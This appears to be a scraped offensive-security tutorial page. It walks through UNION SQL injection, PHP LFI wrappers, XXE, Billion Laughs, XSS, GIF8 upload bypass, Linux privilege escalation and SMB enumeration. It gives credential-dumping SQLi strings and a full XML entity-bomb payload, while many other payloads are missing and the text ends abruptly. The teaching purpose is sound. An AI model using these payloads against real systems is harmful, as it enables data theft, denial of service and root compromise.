What is UNION-Based SQL Injection?

UNION-based SQL Injection is a technique where an attacker uses the SQL <highlight>UNION</highlight> operator to combine results from the original query with a malicious query. This allows attackers to retrieve data from other tables in the database.
Discovering Column Count Using ORDER BY

blocks.code:
?id=1 ORDER BY 1--
?id=1 ORDER BY 2--
?id=1 ORDER BY 3--

blocks.text: Attackers increase the column number until the database throws an error. The highest valid number indicates how many columns the original query returns. The <highlight>--</highlight> (or <highlight>#</highlight>) is used to comment out the rest of the original query.
SQLite UNION-Based Injection Basics

SQLite UNION injection leverages the <highlight>UNION</highlight> operator to bypass original query results and display data from the <highlight>sqlite_master</highlight> table. This is essential for SQLite environments where traditional <highlight>information_schema</highlight> does not exist.
Extracting SQLite Version and DB Info

blocks.code:
UNION SELECT 1,sqlite_version(),3--
UNION SELECT 1,file,3 FROM pragma_database_list--

blocks.text: The <highlight>sqlite_version()</highlight> function returns the library version. <highlight>pragma_database_list</highlight> reveals the absolute path of the database file on the server, which can help map the internal directory structure.
Enumerating Tables via sqlite_master

blocks.code: UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--

blocks.text: In SQLite, the <highlight>sqlite_master</highlight> table contains the database schema. Filtering by <highlight>type='table'</highlight> allows us to find the names of all user-created tables.
Enumerating Columns (The 'SQL' Column)

blocks.code: UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table' AND name='users'--

blocks.text: Unlike MySQL, SQLite stores the original <highlight>CREATE TABLE</highlight> statement in the <highlight>sql</highlight> column. Reading this reveals the column names needed to dump data.
String Concatenation and Multi-Row Dumps
If the application only displays one result field, use <highlight>||</highlight> (pipe operator) for concatenation or <highlight>GROUP_CONCAT()</highlight> to pull all rows into a single string.

blocks.code:
UNION SELECT 1,username || ':' || password,3 FROM users--
UNION SELECT 1,GROUP_CONCAT(username),3 FROM users--

blocks.text: Important Rules for UNION SQL Injection

blocks.title: Requirements for UNION Injection
items: The number of columns in the UNION query must match the original query
Data types in the columns must be compatible with the original columns
The original query should be made to return 'nothing' (e.g., id=-1) so only the injected data shows
At least one column from the original query must be visible on the webpage

blocks.text: Conclusion

UNION-based SQL Injection is a powerful method for data extraction. In <highlight>SQLite</highlight>, the reliance on <highlight>sqlite_master</highlight> and the <highlight>||</highlight> operator are the key differences from MySQL. Mastering these shifts allows for successful enumeration across different database engines.

What is LFI?
LFI stands for <highlight>Local File Inclusion</highlight>. It is a vulnerability that allows an attacker to include and read files from the local server through a vulnerable parameter.

When exploiting LFI, the file is accessed by the web server process, typically running as <highlight>www-data</highlight>. This means you can only read files that the web server user (<highlight>www-data</highlight>) has permission to access.

blocks.text: Filter - LFI

blocks.title: php://filter
items: It allows you to apply filters before PHP reads or writes a file.
In short, you are telling PHP: <highlight>Before processing this file, modify its content.</highlight>

blocks.text: Let's look at a basic example.

blocks.title: Understanding the Command
items: Here we used <highlight>convert.base64-encode</highlight> to encode the file so that PHP does not execute the code.
The server returns the content in <highlight>base64</highlight> format, which we can decode locally to read the source code.

blocks.text: Filter + read - LFI

blocks.title: What is read?
items: <highlight>read=</highlight> tells PHP to apply filters when the file is being read.
If only one filter is used, PHP assumes read mode automatically, so writing <highlight>read=</highlight> is optional.
When chaining multiple filters, <highlight>read=</highlight> must be explicitly defined.

blocks.text: Now let's look at a chained read filter.

blocks.title: Understanding the Chained Filters
items: This command first <highlight>encodes</highlight> the file using base64.
Then it applies <highlight>string.rot13</highlight> to rotate the encoded string.
Multiple filters can be combined using the <highlight>|</highlight> symbol.
Filters are applied from left to right.

blocks.text: Filter + write - LFI

blocks.title: What is write?
items: <highlight>write=</highlight> applies filters when data is being written to a file.
It modifies the data before it is saved.
This only works if the application uses file-writing functions such as <highlight>file_put_contents()</highlight> or <highlight>fwrite()</highlight>.
In a normal LFI using include(), <highlight>write=</highlight> does not work because include() only reads files.

blocks.title: Understanding the Command
items: For this to work, the application must write user-controlled data into the file.
You must supply base64-encoded content (for example in a POST body).
The write filter will decode the data first, then save the decoded result into <highlight>shell.php</highlight>.
If there is no file-writing function in the application, this technique will not work.

blocks.title: data://
items: The data:// wrapper allows embedding file content directly inside a URL.
Basic structure: <highlight>data://[mime-type],[data]</highlight>
It works when vulnerable code uses functions like <highlight>include($_GET['file']);</highlight>
<highlight>allow_url_include=On</highlight> is required when using include() with URL wrappers.

If URL wrappers are disabled in php.ini, this technique will not work.

Expect Wrapper - LFI

blocks.title: expect://
items: The <highlight>expect://</highlight> wrapper allows execution of system commands directly from PHP.
It does NOT require PHP tags like <highlight><?php ?>.</highlight>
It works only if the <highlight>PECL Expect extension</highlight> is installed and enabled.
If the wrapper is available, <highlight>include()</highlight> will execute OS commands.
This wrapper is rarely enabled in real-world production environments.

The <highlight>expect://</highlight> wrapper interprets the value as a system command.
The command executes on the operating system.
The output of the command is returned as stream content.
<highlight>include()</highlight> outputs the command result to the browser.

PHAR Wrapper - LFI

blocks.title: phar://
items: The <highlight>phar://</highlight> wrapper allows access to PHP Archive (PHAR) files.
PHAR files can contain <highlight>serialized metadata</highlight>.
When accessed through certain file functions, PHP automatically performs <highlight>deserialization</highlight>.
If a vulnerable class contains <highlight>__wakeup()</highlight> or <highlight>__destruct()</highlight>, this can lead to <highlight>Remote Code Execution (RCE)</highlight>.
This wrapper is highly relevant in real-world applications with file upload functionality.

blocks.text: Execution Flow

blocks.title: How Deserialization Leads to RCE
items: The application allows <highlight>file upload</highlight> (e.g., image files).
An attacker creates a malicious <highlight>PHAR archive</highlight> disguised as an image (e.g., file.jpg).
The PHAR contains malicious <highlight>serialized object metadata</highlight>.
The application later calls <highlight>include($_GET['file']);</highlight> or another file function.
When accessed via <highlight>phar://</highlight>, PHP automatically deserializes the metadata.
If a gadget chain exists, <highlight>__destruct()</highlight> or <highlight>__wakeup()</highlight> executes attacker-controlled code.

blocks.text: Basic PHAR Access Test

If the file is a crafted PHAR, deserialization may trigger automatically.
Requirements for Exploitation

blocks.title: Conditions Needed
items: The server must allow <highlight>file uploads</highlight>.
The application must use a vulnerable file operation (include, require, file_exists, etc.).
A <highlight>deserialization gadget chain</highlight> must exist in the application.
The PHAR file must be reachable via the filesystem path.

blocks.text: Why phar:// Is Dangerous

blocks.title: Real-World Relevance
items: Used in real-world <highlight>WordPress</highlight> and <highlight>Laravel</highlight> vulnerabilities.
Works even when direct PHP code injection is blocked.
Does not require <?php ?> in the request.
Can bypass certain file extension restrictions.
Frequently appears in modern CVEs involving file handling.

items: Impact: High (Potential RCE via deserialization).
Difficulty: Medium to High (Requires gadget chain knowledge).

What is Log Poisoning?

Log Poisoning is a technique where an attacker injects malicious PHP code into a server log file and then uses a Local File Inclusion (LFI) vulnerability to include that log file, causing the injected code to execute.
This works because PHP parses any file included via <highlight>include()</highlight> or <highlight>require()</highlight> as PHP source code, regardless of its file extension.

What is Reflected XXE?
Reflected XXE occurs when a server parses attacker-controlled XML input and reflects expanded external entity content directly in the HTTP response.
Vulnerable PHP Code

blocks.code:
<?php
$xml = file_get_contents("php://input");

$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

echo $dom->saveXML();
?>

blocks.text: <highlight>LIBXML_DTDLOAD</highlight> allows DOCTYPE processing. <highlight>LIBXML_NOENT</highlight> forces entity expansion. Without both, reflected XXE would not work.
Step 1 - Confirm XML Parsing
The server reflects the XML, confirming that user-supplied input is parsed and returned.
Step 2 - Define External Entity
Step 3 - Send Malicious XML
Step 4 - Observe Reflected File Content
The entity &xxe; is expanded by the XML parser, causing the contents of /etc/passwd to be injected into the XML response and reflected back to the attacker.
Execution Flow

blocks.title: How Reflected XXE Executes
items: User sends malicious XML with DOCTYPE.
Parser loads DTD (LIBXML_DTDLOAD).
Entity expansion is enabled (LIBXML_NOENT).
Parser encounters &xxe;.
SYSTEM resource is fetched.
Content replaces entity reference.
Application reflects processed XML.

blocks.text: Required Conditions

blocks.title: Conditions for Reflected XXE
items: Application must parse XML input.
DOCTYPE must be allowed.
Entity expansion must be enabled.
Response must reflect parsed XML to observe output.

blocks.text: Conclusion

Reflected XXE allows attackers to read local files when XML parsing is misconfigured. The vulnerability exists because unsafe parser flags enable external entity expansion and the application reflects the processed output.
Understanding Stored (Persistent) XSS

<highlight>Stored XSS</highlight> is the most dangerous type of XSS. The malicious script is permanently stored on the target server (e.g., in a database). When a victim navigates to the affected page, the browser retrieves the script and executes it automatically.
The Attack Lifecycle

blocks.title: Execution Stages
items: **Injection:** The attacker finds an input field (comments, profile bio, message board) that saves to a database.
**Storage:** The server fails to sanitize the input and saves the raw JavaScript string.
**Execution:** Every user who loads that page pulls the script from the database and runs it in their own browser context.
**Impact:** Can be used for mass cookie theft, redirecting all visitors to a phishing site, or defacing the website.

blocks.text: Common Attack Vectors
Why it is NOT Reflected XSS

Unlike Reflected XSS, which requires a victim to click a <highlight>malicious link</highlight>, Stored XSS is passive. The victim only needs to browse the legitimate website normally to be compromised. It is 'Stored' because the payload lives in the web application's data.
Developer Best Practices

blocks.title: How to Stop Persistent Scripts
items: **Input Validation:** Only allow expected characters (e.g., alphanumeric only for usernames).
**Output Encoding:** Convert characters like < to < so the browser treats them as text, not code.
**Content Security Policy (CSP):** Restrict which scripts can run and where they can load from.

blocks.text: Understanding Blind XSS

<highlight>Blind XSS</highlight> is a form of Stored XSS where the malicious payload is executed in a high-privileged application or page that the attacker cannot access. The attacker 'fires and forgets,' waiting for a callback from a victim (usually an administrator) who views the stored data in an internal dashboard.
Testing for Blind Vulnerabilities

blocks.title: Why alert() Often Fails in Blind Scenarios
items: If you use <highlight>alert()</highlight>, the popup triggers on the Admin's screen, not yours.
The Admin will immediately know they are under attack and close the ticket/report.
To succeed, you need an <highlight>Out-of-Band (OOB)</highlight> callback to confirm execution.

blocks.text: The Callback Payload (Silent Data Theft)

The goal is to be <highlight>silent</highlight>. The payload reaches out to the attacker's server, carrying the sensitive session cookie as a URL parameter. The Admin sees nothing unusual on their dashboard while their session is being hijacked.
The 'Wait and See' Methodology

blocks.title: Execution Steps
items: **Identify Entry Point:** Find a form that an admin must eventually review (Support Tickets, Bug Reports, Contact Forms).
**Deploy Listener:** Set up <highlight>Netcat</highlight>, <highlight>Python SimpleHTTPServer</highlight>, or a tool like <highlight>XSS Hunter</highlight>.
**Inject Payload:** Submit the callback script into the form.
**Wait:** Execution only happens when the Admin logs in and views your specific entry.
**Capture:** Check logs for an incoming GET request containing a Base64 string.

blocks.text: Key Differences

The main difference between Blind and normal Stored XSS is the <highlight>Visibility</highlight>. In normal Stored XSS, you can verify the exploit yourself. In Blind XSS, you rely entirely on your <highlight>external listener</highlight> to know if the attack was successful.

What is Blind XXE?
Blind XXE occurs when the server parses attacker-controlled XML and expands external entities, but does NOT reflect the processed XML in the HTTP response.
Vulnerable PHP Code (Blind Scenario)

blocks.code:
<?php
$xml = file_get_contents("php://input");

$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

echo "Processed";
?>

blocks.text: The XML is parsed with entity expansion enabled, but the processed XML is NOT returned. Therefore, entity output cannot be seen directly.
Step 1 - Setup Attacker Server
Step 2 - Create External DTD (evil.dtd)
%file reads and base64-encodes the target file. %evil dynamically creates a new entity that forces the server to send the file content to the attacker server.
Step 3 - Create Blind Payload
The payload loads the external DTD from the attacker. The DTD injects the exfil entity. The &exfil; reference triggers the outbound request.
Step 4 - Send Malicious XML
Step 5 - Observe Outbound Request
The victim first requests evil.dtd. Then it sends a second request containing base64-encoded file data as a query parameter.
Execution Flow

blocks.title: How Blind XXE Executes
items: User sends malicious XML.
Server parses DOCTYPE (LIBXML_DTDLOAD enabled).
External DTD is fetched from attacker.
Parameter entities are expanded.
Dynamic exfil entity is created.
XML body references &exfil;.
Server makes outbound HTTP request with file data.
Attacker receives exfiltrated content.

blocks.text: Required Conditions

blocks.title: Conditions for Blind XXE
items: Application must parse XML input.
DOCTYPE processing must be enabled.
External entity expansion must be allowed.
Outbound network requests must be permitted.
Attacker-controlled server must be reachable.

blocks.text: Why Base64 Encoding is Used
Raw file content may contain newlines and special characters that break the HTTP request. Base64 ensures safe transmission inside a URL.
Limitations

blocks.title: Common Practical Limitations
items: URI length restrictions (large files fail).
Outbound traffic filtering may block exfiltration.
Modern parsers often disable DTD processing by default.
WAF may block suspicious DOCTYPE usage.

blocks.text: Conclusion
Blind XXE allows attackers to extract sensitive data even when the application does not reflect parsed XML. Data exfiltration occurs through outbound requests triggered by entity expansion.
What is Billion Laughs Attack?
Billion Laughs is an XML Entity Expansion Denial of Service attack where nested entities recursively expand into exponentially large text, exhausting memory and CPU during XML parsing.
Root Cause

The attack works when the XML parser allows internal DTD processing and entity expansion (e.g., LIBXML_NOENT | LIBXML_DTDLOAD). The parser recursively replaces entity references without strict expansion limits.
Vulnerable PHP Code

blocks.code:
<?php
libxml_use_internal_errors(true);

$xml = file_get_contents("php://input");

$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

echo "Parsed successfully";
?>

blocks.text: LIBXML_DTDLOAD loads DTD definitions. LIBXML_NOENT forces entity expansion. Together they allow recursive entity substitution during parsing.
Classic Billion Laughs Payload

blocks.code:
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>

blocks.text: Exponential Growth Calculation
Base entity length = 3 bytes ('lol'). Each level multiplies by 10. Final size at level n = 3 × (10^n). At level 9 → 3 × 10^9 = 3,000,000,000 bytes (~3GB).
Internal Parser Execution Flow

blocks.title: How libxml Expands Entities
items: Parser reads DOCTYPE and builds entity table.
Entity definitions are stored in a hash map.
When &lol9; is encountered, recursive expansion begins.
Each entity is replaced by its defined value.
Replacement buffers are allocated on heap.
Nested replacements trigger further recursion.
Memory grows exponentially due to repeated string concatenation.
CPU usage spikes due to recursive decoding.

blocks.text: Memory and CPU Behavior
Each expansion requires new buffer allocation and copying of previous content. Intermediate buffers also consume memory. Actual usage exceeds theoretical final text size.
Observing Resource Exhaustion

blocks.code:
htop
# or
ps aux | grep php

blocks.text: During attack, PHP process shows high CPU utilization and rapid memory growth. On unprotected systems, this leads to memory exhaustion or OOM killer termination.
Safe Testing Strategy
Reduce depth (e.g., up to lol4 or lol5) or reduce multiplier (5 instead of 10). This prevents multi‑GB expansion and allows safe observation.
Modern libxml Protections

blocks.title: Built-in Defenses in libxml 2.11+
items: Entity expansion counter limit.
Maximum recursion depth restriction.
Maximum text node size limit.
Abort parsing on expansion overflow.
Internal loop detection.

blocks.text: Detecting Protection Trigger
Modern parsers may output errors like 'Entity expansion limit exceeded' or 'Detected an entity reference loop'.
Variants Beyond Classic Billion Laughs

blocks.title: Advanced DoS Variants
items: Quadratic Blowup (large base entity repeated many times).
Parameter Entity Bomb using %entities.
Hybrid XXE + DoS (external DTD + expansion).
Compression-style nested payloads.
Deep but narrow recursion chains.

blocks.text: Mitigation
Disable DTD processing and entity substitution. Avoid LIBXML_NOENT in production. Enforce strict memory limits at application level.
Conclusion

Billion Laughs is a parser-level Denial of Service attack exploiting recursive entity expansion. Modern parsers implement strict expansion limits, but legacy systems and custom parsers remain vulnerable.
What is XInclude?

<highlight>XInclude</highlight> is an <highlight>XML feature</highlight> that allows one XML document to include content from another file using <highlight><xi:include></highlight> elements. It is processed at the <highlight>XML parsing stage</highlight> and does not require a <highlight>DOCTYPE</highlight> declaration like classic <highlight>XXE</highlight>.
Root Cause

The vulnerability occurs when the <highlight>XML parser</highlight> has <highlight>XInclude processing enabled</highlight> (e.g., <highlight>DOMDocument->xinclude()</highlight>) and <highlight>user-controlled XML input</highlight> is parsed without validation. The parser fetches <highlight>external resources</highlight> referenced in the <highlight>xi:include</highlight> element.
Why XInclude Matters

blocks.title: Difference from Classic XXE
items: Does NOT require <highlight><!DOCTYPE></highlight>.
Works even when <highlight>DTD processing</highlight> is disabled.
Often bypasses <highlight>naive XXE protections</highlight>.
Requires explicit <highlight>XInclude processing call</highlight>.
Looks like normal XML structure (less suspicious).

blocks.text: Vulnerable PHP Code

The dangerous part is <highlight>$dom->xinclude()</highlight>. This explicitly tells <highlight>libxml</highlight> to process <highlight><xi:include></highlight> elements and fetch <highlight>external resources</highlight>.
Basic File Read Payload
The parser fetches <highlight>/etc/passwd</highlight> and inserts its content into the XML output. <highlight>parse="text"</highlight> forces raw text inclusion instead of XML parsing.
Internal Execution Flow

blocks.title: How XInclude Works Internally
items: Parser loads initial XML document.
Namespace <highlight>http://www.w3.org/2001/XInclude</highlight> is detected.
When <highlight>xinclude()</highlight> is called, <highlight>libxml</highlight> scans for <highlight><xi:include></highlight> nodes.
For each include node, libxml fetches the resource from <highlight>href</highlight>.
Resource is loaded into memory.
Content replaces the <highlight><xi:include></highlight> element in DOM tree.
Final DOM is serialized back to output.

blocks.text: XInclude for SSRF
If network access is allowed, the server makes a backend <highlight>HTTP request</highlight> to the internal service. This converts XInclude into an <highlight>SSRF primitive</highlight>.
Can XInclude Lead to RCE?

Direct <highlight>RCE</highlight> is rare. XInclude is primarily a <highlight>file read primitive</highlight> or <highlight>SSRF vector</highlight>. However, if included content is later passed to <highlight>eval()</highlight>, <highlight>include()</highlight>, or template rendering engines, it may escalate to code execution.
Detecting XInclude Vulnerability

If <highlight>DOCTYPE-based XXE</highlight> is blocked but XInclude works, you will see <highlight>external file content</highlight> reflected after adding <highlight>xmlns:xi</highlight> and <highlight>xi:include</highlight> elements.
Mitigation

blocks.code:
$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING);
// DO NOT call $dom->xinclude();

blocks.text: Avoid calling <highlight>xinclude()</highlight>. Use <highlight>LIBXML_NONET</highlight> to block network access. Validate or sanitize XML input.
Conclusion

<highlight>XInclude</highlight> is an XML inclusion mechanism that can be abused for <highlight>file disclosure</highlight> and <highlight>SSRF</highlight> when <highlight>xinclude()</highlight> processing is enabled. It bypasses traditional <highlight>XXE defenses</highlight> because it does not rely on <highlight>DTD</highlight>.

What is SQL Injection?

SQL Injection (SQLi) is a vulnerability that occurs when user input is directly included inside a database query without proper validation or parameterization. An attacker can inject SQL syntax to alter the structure of the query executed by the database.

SQL Injection happens when developers construct queries using string concatenation instead of safe query mechanisms such as prepared statements.

What is UNION-Based SQL Injection?

UNION-based SQL Injection is a technique where an attacker uses the SQL <highlight>UNION</highlight> operator to combine results from the original query with a malicious query. This allows attackers to retrieve data from other tables in the database.
Example Lab Database
Database Content

blocks.code:
id | name   | description
1  | Laptop | Gaming Laptop
2  | Phone  | Android Phone

$query = "SELECT name, description FROM products WHERE id=$id";

blocks.text: The application directly inserts user input into the SQL query. This allows attackers to modify the query structure and perform SQL injection.
Normal Application Request
Query Executed by Database

blocks.text: Application Output
Discovering Column Count Using ORDER BY

?id=1 ORDER BY 2

blocks.text: Attackers increase the column number until the database throws an error. The highest valid number indicates how many columns the original query returns.
Testing UNION Injection
Final Query Executed
Application Output
If the numbers appear in the output, it means the UNION injection worked and the attacker can control the returned data.
Extracting Database Name
Database Output
Enumerating Tables

Enumerating Columns

blocks.text: Columns Found
Using CONCAT to Merge Data
Sometimes the application only displays one column. Attackers use the SQL <highlight>CONCAT()</highlight> function to merge multiple fields into a single column so that more data can be displayed.
Merged Output
Dumping Entire Table Data
After discovering the table and column names, attackers can dump the entire table to extract sensitive information such as usernames and passwords.
Dumped Data
Using GROUP_CONCAT for Full Data Dump

Sometimes the application only shows a single row of output. Attackers use the SQL <highlight>GROUP_CONCAT()</highlight> function to combine multiple rows into one single result. This allows dumping a large amount of data in a single response.
Combined Dump Output
Using LIMIT to Extract Specific Rows
Some applications restrict how many results are displayed. Attackers can use the SQL <highlight>LIMIT</highlight> clause to retrieve specific rows from the database one by one.

blocks.code: ?id=-1 UNION SELECT username,password FROM users LIMIT 0,1
?id=-1 UNION SELECT username,password FROM users LIMIT 1,1
?id=-1 UNION SELECT username,password FROM users LIMIT 2,1

blocks.text: Row by Row Extraction
Understanding LIMIT Offset
The LIMIT clause works as LIMIT offset,count. The offset specifies where the database should start returning rows. Attackers increase the offset value to iterate through the entire table.

The injected query must return the same column count
At least one column must be visible in the application output

blocks.text: Conclusion

UNION-based SQL Injection allows attackers to merge malicious queries with legitimate queries. This enables attackers to enumerate databases, discover tables and columns, and extract sensitive data from the database.

blocks.text: GIF8 File Upload Bypass

GIF8 bypass is a file upload exploitation technique where a malicious PHP payload is prefixed with a fake GIF image header (GIF8). This makes the file appear as a valid image to upload filters while still containing executable PHP code.
Why GIF8 Bypass Works

Many web applications only check the beginning bytes of uploaded files (magic bytes) to determine if the file is a valid image. Since real GIF images start with GIF87a or GIF89a, attackers can prefix malicious PHP code with GIF8 to trick the validation logic into accepting the file.
Example GIF8 Web Shell Payload

The string GIF8 mimics the beginning of a GIF image header. Upload filters see it as an image, but when the file is later included or executed by PHP, the PHP interpreter ignores the GIF8 text and executes the PHP code.
Creating a GIF8 Web Shell
This command creates a polyglot file that appears to be a GIF image but actually contains a PHP command execution payload.
Uploading the GIF8 Shell

Upload the shell.gif file through the application's file upload functionality. If the application only checks file headers or extensions, the GIF8 prefix may allow the upload to bypass the validation.
How to Confirm GIF8 Upload Vulnerability
1. Upload a GIF8 payload file such as shell.gif containing a simple PHP command execution payload.
2. After uploading, access the file directly from the upload directory to verify that it exists.
3. If the file displays raw PHP code or the GIF8 string, the server is treating it as a static image. This means the upload succeeded but the file is not executed directly.
4. Look for a Local File Inclusion (LFI) or file inclusion vulnerability that can force the server to include the uploaded file.
Executing GIF8 Shell via LFI
If the application includes the uploaded file through a vulnerable parameter, PHP interprets the contents of the GIF8 file and executes the embedded PHP code, resulting in remote command execution.
Testing Command Execution
If the exploit is successful, the response will contain the command output (for example www-data). The output may begin with GIF8 because it is part of the uploaded file header.
Important Notes
The GIF8 string often appears in the command output because it is printed before the PHP code executes.
This technique works when upload filters rely on weak file type validation such as extension checks, MIME checks, or simple magic byte validation.
The technique becomes especially powerful when combined with Local File Inclusion (LFI), allowing attackers to turn file upload into Remote Code Execution.
GIF8 Exploitation Flow
1. Create GIF8 web shell payload.
2. Upload shell.gif through vulnerable upload functionality.
3. Identify the upload directory path.
4. Find a Local File Inclusion vulnerability.
5. Include the uploaded file to execute the PHP payload.

blocks.text: Writable /etc/shadow Privilege Escalation

The <highlight>/etc/shadow</highlight> file stores hashed passwords for all Linux users. Normally this file is accessible only by the <highlight>root user</highlight>. If the file becomes <highlight>world-writable</highlight>, any user on the system can modify password hashes and reset the root password, resulting in full system compromise.
Check /etc/shadow Permissions
If the permissions show <highlight>-rw-rw-rw-</highlight>, it means the file is writable by everyone. This is a critical misconfiguration because it allows any user to modify stored password hashes.
Generate a New Password Hash
This command generates a <highlight>SHA-512 password hash</highlight>. Linux systems store password hashes instead of plain text passwords in <highlight>/etc/shadow</highlight>.
Edit the /etc/shadow File
Locate the <highlight>root</highlight> entry and replace the existing hash with the newly generated SHA-512 hash. This changes the root password to the attacker's chosen password.
Switch to Root User
After replacing the root password hash, using <highlight>su root</highlight> with the new password grants a <highlight>root shell</highlight> and full administrative privileges.
Structure of /etc/shadow Entry

Each line in <highlight>/etc/shadow</highlight> contains authentication information. The second field stores the <highlight>hashed password</highlight>. Modifying this field for the root account allows an attacker to set a new root password.

If the file becomes <highlight>world-writable</highlight>, an attacker can modify account entries or inject password hashes to gain root privileges.
Check /etc/passwd Permissions

If the permissions show <highlight>-rw-rw-rw-</highlight>, it means every user can modify the <highlight>/etc/passwd</highlight> file. This is a critical vulnerability because attackers can alter user entries or insert their own privileged accounts.
Generate a Password Hash

This command generates a <highlight>password hash</highlight> that can be placed inside the <highlight>/etc/passwd</highlight> file. Historically, Linux systems stored password hashes directly in this file.
Modify Root User Entry

Switch to Root User
After modifying the root entry, the attacker can switch to the root account using <highlight>su root</highlight> and enter the new password to obtain a <highlight>root shell</highlight>.
Alternative Method: Create New Root User

Another method is to copy the root entry and append it to the bottom of the file, changing the username to <highlight>newroot</highlight> and inserting the generated password hash. Because the UID is <highlight>0</highlight>, the new account will have root privileges.

Each line represents a user account. The <highlight>UID</highlight> determines privilege level. UID <highlight>0</highlight> corresponds to the root user, so any account with UID 0 will have full administrative privileges.

blocks.text: Why sudo -l is Important

The <highlight>sudo -l</highlight> command is one of the most important privilege escalation checks during Linux enumeration. Many real-world compromises occur because administrators allow users to run powerful programs with sudo without understanding that these binaries can spawn shells or execute arbitrary commands.
Privilege Escalation via LD_PRELOAD

<highlight>LD_PRELOAD</highlight> is an environment variable used by the Linux dynamic loader to load a <highlight>shared library (.so)</highlight> before any other libraries when a program starts. If this variable is preserved in <highlight>sudo</highlight> configurations, a user can force the loader to execute a malicious shared object before the target program runs, which may lead to <highlight>root privilege escalation</highlight>.
Check if LD_PRELOAD is Allowed

blocks.code:
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/vim

blocks.text: If the sudo configuration contains <highlight>env_keep+=LD_PRELOAD</highlight>, it means the environment variable <highlight>LD_PRELOAD</highlight> will not be removed when running commands with sudo. This misconfiguration allows a user to inject a malicious shared library into programs executed with <highlight>sudo privileges</highlight>.
Creating a Malicious Shared Library

This command compiles a malicious C program into a <highlight>shared object (.so)</highlight>. The flags <highlight>-fPIC</highlight> and <highlight>-shared</highlight> create position-independent code suitable for shared libraries, while <highlight>-nostartfiles</highlight> prevents standard startup routines from being included.
Example Malicious Library Code

The <highlight>_init()</highlight> function runs automatically when the shared library is loaded by the dynamic loader. The function sets the process UID and GID to <highlight>0 (root)</highlight> and then spawns a <highlight>bash shell</highlight>, resulting in a root shell if the program runs with sudo privileges.
Executing the Exploit

When the command runs, the dynamic loader loads <highlight>/tmp/preload.so</highlight> before other libraries because of the <highlight>LD_PRELOAD</highlight> variable. Since the program is executed with <highlight>sudo</highlight>, the malicious library runs with <highlight>root privileges</highlight> and spawns a root shell.
Execution Flow of the Attack

Compile the shared library using gcc
Run a permitted sudo command while setting LD_PRELOAD
The dynamic loader loads the malicious library first
The _init() function executes automatically

blocks.text: Why This Misconfiguration is Dangerous

Allowing <highlight>LD_PRELOAD</highlight> in sudo environment variables is extremely dangerous because it allows arbitrary code execution before a program starts. If a user can run any command with sudo while controlling <highlight>LD_PRELOAD</highlight>, they can load a malicious library and gain <highlight>root privileges</highlight>.
Privilege Escalation via LD_LIBRARY_PATH

<highlight>LD_LIBRARY_PATH</highlight> is an environment variable used by the Linux dynamic loader to define additional directories where shared libraries should be searched before the system default locations. If this variable is preserved in <highlight>sudo</highlight> configurations, a user can force a program to load a malicious shared library from a custom directory, potentially resulting in <highlight>root privilege escalation</highlight>.

blocks.text: If the sudo configuration contains <highlight>env_keep+=LD_LIBRARY_PATH</highlight>, the environment variable will not be removed when running commands with sudo. This allows a user to control where the dynamic loader searches for shared libraries.
Identify Libraries Used by the Target Program

The <highlight>ldd</highlight> command lists the shared libraries required by a program. These libraries are normally loaded from system directories, but the search order can be changed using <highlight>LD_LIBRARY_PATH</highlight>.
Creating a Malicious Shared Library

This command compiles a malicious C program into a shared library named <highlight>libcrypt.so.1</highlight>. The name is chosen because it matches a legitimate library used by the target program, allowing it to be replaced during the loading process.
Example Malicious Library Code

The <highlight>_init()</highlight> function executes automatically when the library is loaded. It changes the process UID and GID to <highlight>root (0)</highlight> and spawns a <highlight>bash shell</highlight>.

blocks.text: SMB (Server Message Block) Fundamentals

<highlight>SMB</highlight> is a client-server protocol used for sharing access to files, printers, and serial ports. On modern Windows systems, it runs on <highlight>Port 445</highlight>. A <highlight>Share</highlight> is a folder made accessible over the network.
Enumerating Available Shares

The <highlight>-L</highlight> flag lists shares, and <highlight>-N</highlight> attempts a connection with <highlight>No Password</highlight> (Null Session). Shares ending in <highlight>$</highlight> are administrative and usually hidden.
Advanced Spidering & Recursive Discovery

blocks.code: smbclient //10.10.10.10/sharename -N -c 'mask ""; recurse ON; prompt OFF; ls'

blocks.text: Use <highlight>recurse ON</highlight> to view the entire directory tree. Setting <highlight>mask ""</highlight> ensures all files (including hidden ones) are listed. <highlight>prompt OFF</highlight> suppresses confirmation for batch operations.
Mounting SMB Shares Locally (Linux)
Mounting a share allows you to use local Linux tools like <highlight>grep</highlight> or <highlight>find</highlight> directly on the remote content without downloading individual files manually.
File Transfers: Mass Exfiltration & Uploads

Use <highlight>get</highlight> for single files and <highlight>mget *</highlight> to download all files in the current (or recursive) path. If <highlight>prompt OFF</highlight> is set, <highlight>mget</highlight> downloads everything without asking. Uploading a shell via <highlight>put</highlight> to a web root leads to <highlight>RCE</highlight>.

blocks.text: Privilege Escalation via SeImpersonatePrivilege

